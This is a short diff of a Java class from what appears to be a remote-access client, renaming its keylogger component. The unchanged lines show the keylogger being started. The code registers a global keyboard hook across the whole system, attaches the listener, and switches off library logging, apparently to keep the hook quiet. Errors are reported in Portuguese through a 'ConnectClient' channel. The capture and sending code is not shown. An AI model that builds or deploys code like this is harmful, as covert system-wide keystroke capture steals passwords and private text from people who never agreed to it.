@@ -12,7 +12,7 @@ import java.util.logging.Level;
 import java.util.logging.LogManager;
 import java.util.logging.Logger;
 
-public class KeyLoggerComponents implements NativeKeyListener {
+public class ClientKeyLoggerComponents implements NativeKeyListener {
 
     // Key Logger Variables
     public static boolean KEY_LOGGER = false;
@@ -20,11 +20,11 @@ public class KeyLoggerComponents implements NativeKeyListener {
     public static void startKeyLogger() {
         try {
             LogManager.getLogManager().reset();
-            Logger logger = Logger.getLogger(KeyLoggerComponents.class.getPackage().getName());
+            Logger logger = Logger.getLogger(ClientKeyLoggerComponents.class.getPackage().getName());
             logger.setLevel(Level.OFF);
 
             GlobalScreen.registerNativeHook();
-            GlobalScreen.addNativeKeyListener(new KeyLoggerComponents());
+            GlobalScreen.addNativeKeyListener(new ClientKeyLoggerComponents());
         } catch (Exception exception) {
             ConnectClient.msg("Ocorreu um erro ao iniciar o keylogger");
             ConnectClient.exception(exception);
